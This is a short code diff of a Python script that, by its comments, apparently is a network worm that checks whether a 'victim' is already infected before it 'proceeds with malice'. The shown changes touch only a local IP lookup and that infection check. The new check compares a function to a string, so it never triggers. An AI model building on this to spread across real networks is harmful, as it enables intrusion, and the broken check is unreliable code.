@@ -181,16 +181,17 @@ def getMyIP(interface):
 	# TODO: learn netifaces 
 
 	#make the ip address = to none 
-	ipAddress = None
+	ipAddr = None
 
+	#Scour the addresses and return the address that isn't the loopback. 
 	for netFaces in interface:
-		address = netifaces.ifaddresses(netFaces)[2][0]['address']
+		addr = netifaces.ifaddresses(netFaces)[2][0]['addr']
 
-		#Yo we don't want address to be the loopback, literally anything else is okay for now 
-		if address != "127.0.0.1":
-			ipAddress = address
+		if not addr == "127.0.0.1":
+			ipAddr = addr
+			break
 
-	return ipAddress
+	return ipAddr
 
 #######################################################
 # Returns the list of systems on the same network
@@ -241,7 +242,7 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
-	if isInfectedSystem():
+	if isInfectedSystem == "True":
 		print("Already infected")
 		exit(0)
 	else:
